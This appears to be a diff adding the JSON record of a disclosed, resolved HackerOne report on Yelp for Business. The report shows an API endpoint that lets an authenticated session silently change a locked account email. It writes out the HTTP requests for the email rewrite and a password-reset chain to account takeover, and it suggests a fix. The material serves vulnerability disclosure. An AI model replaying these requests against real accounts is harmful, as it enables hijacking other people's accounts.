@@ -1,0 +1,137 @@
+{
+  "id": 3766455,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzY2NDU1",
+  "url": "https://hackerone.com/reports/3766455",
+  "title": "Yelp for Business: locked Email field silently editable via API",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-28T09:34:39.821Z",
+  "submitted_at": "2026-05-28T09:34:40.772Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0xmanticore",
+    "url": "/0xmanticore",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ihojel5zft0ppdatmopquqbntd36/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 545,
+    "url": "https://hackerone.com/yelp",
+    "handle": "yelp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/545/de556165eaf2da7600f9ce75d1179281ee2d538f_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Yelp",
+      "twitter_handle": "",
+      "website": "https://www.yelp.com",
+      "about": "Connecting people to great local businesses in communities around the world."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-02T15:36:44.830Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-02T15:36:41.915Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Description\n\nThe Account Information screen in the Yelp Biz Android app renders the Email field as read-only with a lock icon; the screen exposes no editor. The Save action calls `POST https://biz-app.yelp.com/account/info/bio/v1`. The endpoint accepts and applies an attacker-supplied `email` value with no current-password check, no current-email confirmation, and no out-of-band email confirmation before the change takes effect. The change is reflected immediately on the same REST surface and on the independent `graphql-mobile-api.yelp.com` `GetAccountInfo` query, and the Account Information screen in the app subsequently shows the attacker email — still behind the lock icon.\n\nDirect password change at `POST /account/password/v1` enforces an `old_password` field (400 without it). The bio endpoint provides no equivalent protection on the email field, even though email is the account recovery anchor.\n\n## Steps to Reproduce\n\nPrerequisites: a Yelp for Business account; an `x-auth-token` from that account (any active app session header); an attacker-controlled mailbox.\n\n1. Confirm baseline on a different backend so the rest is not an echo:\n   ```\n   POST https://graphql-mobile-api.yelp.com/gql/mobile\n   x-auth-token: <victim_token>\n   x-biz-auth-token: <victim_token>\n   operation-name: GetAccountInfo\n   accept: multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json\n   content-type: application/json; charset=utf-8\n\n   {\"extensions\":{\"clientLibrary\":{\"name\":\"apollo-kotlin\",\"version\":\"4.4.3\"},\"documentId\":\"fbfe5585929a3f12b0fcf332f967dfb78e3197d5a4f27f2f69f112c4d3341db6\",\"operationType\":\"query\"},\"variables\":{}}\n   ```\n   Response (the legitimate email on file):\n   ```json\n   {\"data\":{\"loggedInBizUser\":{\"__typename\":\"BizUser\",\"encid\":\"T3J1i32FZSDAi5427SW0cw\",\"private\":{\"__typename\":\"PrivateBizUserInfo\",\"email\":\"victim@example.com\",\"hasConfirmedEmail\":false,\"loginProviders\":[\"GOOGLE\"]}}}}\n   ```\n\n2. Mass-assign the email:\n   ```\n   POST https://biz-app.yelp.com/account/info/bio/v1\n   x-auth-token: <victim_token>\n   x-device-id: <any>\n   x-consumer-device-id: <any>\n   content-type: application/json; charset=UTF-8\n\n   {\"first_name\":\"<current>\",\"last_name\":\"<current>\",\"email\":\"attacker@example.com\",\"role\":\"OWNER\"}\n   ```\n   Response — **HTTP 200**, attacker email applied, no challenge, no notification at request time:\n   ```json\n   {\"first_name\":\"<current>\",\"last_name\":\"<current>\",\"email\":\"attacker@example.com\",\"role\":\"OWNER\"}\n   ```\n\n3. Re-run the GraphQL query from step 1 — `private.email` now reflects `attacker@example.com` on a different Yelp backend service, proving the change is persisted at the data layer rather than echoed:\n   ```json\n   {\"data\":{\"loggedInBizUser\":{\"__typename\":\"BizUser\",\"encid\":\"T3J1i32FZSDAi5427SW0cw\",\"private\":{\"__typename\":\"PrivateBizUserInfo\",\"email\":\"attacker@example.com\",\"hasConfirmedEmail\":false,\"loginProviders\":[\"GOOGLE\"]}}}}\n   ```\n\n4. Open the Yelp Biz app's Account Information screen — the Email field renders `attacker@example.com` with the lock icon, identical to the legitimate UI state.\n\n{F6000125}\n>Yelp for Business → Account Information, Email field showing the attacker-controlled address with the lock icon next to it. The UI continues to present the field as read-only even though the value has been silently rewritten via the API.\n\n5. (Chain to ATO) Trigger a password reset for the rewritten address:\n   ```\n   POST https://biz-app.yelp.com/account/forgot_password/v1\n   content-type: application/x-www-form-urlencoded\n\n   email=attacker%40example.com\n   ```\n   Returns HTTP 200. Within a few minutes Yelp delivers a `Reset Password - Yelp` email to the attacker mailbox containing `https://biz.yelp.com/forgot/reset/redirect/<token>`. Visiting that link allows setting a new password without supplying the old one; `POST /account/login/v1` with the rewritten email plus the attacker-chosen password then yields full ownership.\n\n{F6000118}\n>The real `Reset Password - Yelp` email (from `no-reply@yelp.com`) arriving at the attacker-controlled inbox after `POST /account/forgot_password/v1`, with the `Reset Password` button linking to `https://biz.yelp.com/forgot/reset/redirect/<token>`. Demonstrates that the rewritten address is the live recovery anchor — closing the chain from token theft to permanent ATO.\n\n## Suggested Fix\n\nReject `email` on `POST /account/info/bio/v1`. Expose email changes only through a dedicated flow that (a) re-authenticates the user (current password or recent step-up) and (b) keeps the change in a pending-confirmation state — the new address only becomes authoritative after the user clicks a verification link sent to that new address, and a notification is sent to the previous address at the same time. Aligning the protection on email changes with the protection already in place on `/account/password/v1` would close the chain.\n\n## Impact\n\n- **Confirmed:** an authenticated session can silently rewrite the account email, bypassing the read-only UI control. The Yelp Biz app then displays the rewritten value as if it were the legitimate (locked) email. The change persists immediately on `biz-app.yelp.com` REST and on `graphql-mobile-api.yelp.com` GraphQL.\n- **Potential ATO (chain):** the rewritten email is the account-recovery anchor. `POST /account/forgot_password/v1` with the rewritten email returns 200 and Yelp dispatches a real `Reset Password - Yelp` email. Because `/account/password/v1` enforces `old_password` but the reset link does not, an attacker who briefly holds a victim's session token can use this bug to escalate ephemeral token access into permanent credentialed ownership: rebind → forgot-password → receive reset link at attacker address → set new password → log in.",
+  "weakness": {
+    "id": 102,
+    "name": "Client-Side Enforcement of Server-Side Security"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6000118,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6jw5yiuwdm9qlf18uahgirswj9tk?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WGCPMEI%2F20260702%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260702T174508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIHaNWkBnzS2AzosAF0JasXa5pvaMbhOy8t%2BvqWzFwne%2BAiBr5Rx0k5Ojl5VPRuo7HINGp1xf594ZYb6ejNaDvA7nACq7BQj5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMoyKom%2BdPrfy9aAWEKo8FYx4YiKCPfQLrMqwtgcrdYQu1UxR25%2FKWMEbJ49loWlHV15qwTmIIFgt12ujeTG1AE3atsSV7VVroJUWF%2B%2ByEVPeiz9NXdqwiLQw%2FJtNrrkmBS8AS9J%2FtMfWPoFG8ePH%2FtNZop8Ji4DKPhRvBl54AEwwhL7eiLxuC9ZMp6mRJRf9S%2Bk2BrROBWQZpGWmTvpAlgIvuTFWil7EfbImg%2B4cTEXD5vKgmTg5yC6Dnb6bLP2wulZ5DVRVRmWonxz%2FKQ%2Bwau9KrWY1ChtBdq24R3MD0HSSTaKlCFUM8q62A9qoIqmQG7fBQ%2BOSpPjEyciDxDd9hUK8CgO97jAOWQbGGl%2FYDoESey9Sb2mETx9RXCOzIu%2BiltFV2LJx8J4vQfEJj8HgDUJn9n%2FjelEOcMrg7tm7p4RS5d1gauZvj9a6QnSuQZAxch%2Fk0xlrjIcJEf2hHLMdb605enOdsMVU1dWW2E4uBL6LmI%2F0DIRlZwJNWZ%2FmBVctwfSk8b1GF7jZkrl8ZYz7P5loF2p1pe1hu6yQfp%2FPINds0MtSZDByANnBRzZFSQ2wavzm5BvmE3LZZYY%2ByexNQIrMM%2BsDpd%2FI8w5O3JcqHRhKRMNxhJNbDmr8YcinLU0SF4xk1A3%2BQI6NkWcHsnGogOoVL0xjZwMKkOOppF23qWvzmoXu2iqya6UJHQULZ4w7CHAMvgOQcZCUWi3xKIvEsS4xsVYuxHnVFENuugQL5cdpEo5LWSDggFVkEFQQItFVZ9d8kbaOL86ATo8sDycxqqo0xtjS9fwIjIWYqEwCec0YneVV3inNit92IZ6jx16VeVvfNQxCsSQhdvGWBoyLupP8XppJZZdOF7UjorAl6Kjhl3SSc6SH69Gob%2BTe%2BPDCHiJrSBjqyAYVxVZByQ5BuafdSoYGs4b6l9vIV7CQbgKmQ6rZkBitbTf04TwiVdbfk1oMlzdkVXKPnJRuRPNuqgD3qk75jeEYvKtRkWOy29VfjHUSFSOF2FyJNYrk%2FmzdKAajr2J9fi0DYtnPiHdvtaVIMfrbQIIqb2%2BHhpUjBGpvN0IaZ41oYQJpxTmSxAk9tEgeS0U9RIQoMpK%2BRWzGk4jHQWEfLVBP6T1OQQ%2BjCDW4wpZZTMX%2FkQxo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=85b1eed69a6c054377f3e354d4b9458282e581a80262281a5ba18dab972e77ab",
+      "file_size": 138519,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 6000125,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/grli1qn1p0adhepge6sx0143a3gm?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6WGCPMEI%2F20260702%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260702T174508Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIHaNWkBnzS2AzosAF0JasXa5pvaMbhOy8t%2BvqWzFwne%2BAiBr5Rx0k5Ojl5VPRuo7HINGp1xf594ZYb6ejNaDvA7nACq7BQj5%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMoyKom%2BdPrfy9aAWEKo8FYx4YiKCPfQLrMqwtgcrdYQu1UxR25%2FKWMEbJ49loWlHV15qwTmIIFgt12ujeTG1AE3atsSV7VVroJUWF%2B%2ByEVPeiz9NXdqwiLQw%2FJtNrrkmBS8AS9J%2FtMfWPoFG8ePH%2FtNZop8Ji4DKPhRvBl54AEwwhL7eiLxuC9ZMp6mRJRf9S%2Bk2BrROBWQZpGWmTvpAlgIvuTFWil7EfbImg%2B4cTEXD5vKgmTg5yC6Dnb6bLP2wulZ5DVRVRmWonxz%2FKQ%2Bwau9KrWY1ChtBdq24R3MD0HSSTaKlCFUM8q62A9qoIqmQG7fBQ%2BOSpPjEyciDxDd9hUK8CgO97jAOWQbGGl%2FYDoESey9Sb2mETx9RXCOzIu%2BiltFV2LJx8J4vQfEJj8HgDUJn9n%2FjelEOcMrg7tm7p4RS5d1gauZvj9a6QnSuQZAxch%2Fk0xlrjIcJEf2hHLMdb605enOdsMVU1dWW2E4uBL6LmI%2F0DIRlZwJNWZ%2FmBVctwfSk8b1GF7jZkrl8ZYz7P5loF2p1pe1hu6yQfp%2FPINds0MtSZDByANnBRzZFSQ2wavzm5BvmE3LZZYY%2ByexNQIrMM%2BsDpd%2FI8w5O3JcqHRhKRMNxhJNbDmr8YcinLU0SF4xk1A3%2BQI6NkWcHsnGogOoVL0xjZwMKkOOppF23qWvzmoXu2iqya6UJHQULZ4w7CHAMvgOQcZCUWi3xKIvEsS4xsVYuxHnVFENuugQL5cdpEo5LWSDggFVkEFQQItFVZ9d8kbaOL86ATo8sDycxqqo0xtjS9fwIjIWYqEwCec0YneVV3inNit92IZ6jx16VeVvfNQxCsSQhdvGWBoyLupP8XppJZZdOF7UjorAl6Kjhl3SSc6SH69Gob%2BTe%2BPDCHiJrSBjqyAYVxVZByQ5BuafdSoYGs4b6l9vIV7CQbgKmQ6rZkBitbTf04TwiVdbfk1oMlzdkVXKPnJRuRPNuqgD3qk75jeEYvKtRkWOy29VfjHUSFSOF2FyJNYrk%2FmzdKAajr2J9fi0DYtnPiHdvtaVIMfrbQIIqb2%2BHhpUjBGpvN0IaZ41oYQJpxTmSxAk9tEgeS0U9RIQoMpK%2BRWzGk4jHQWEfLVBP6T1OQQ%2BjCDW4wpZZTMX%2FkQxo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf68fe553c38878dd45d5034d3a87fa3562b52c1485417ce13a276beb44d045b",
+      "file_size": 195748,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-07-02T15:36:42.339Z",
+  "allow_singular_disclosure_after": -7705.807969988,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "anonxr",
+    "0xmanticore",
+    "0xbarq",
+    "haris404",
+    "vendetta_ca",
+    "albert_123"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 43913,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.yelp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
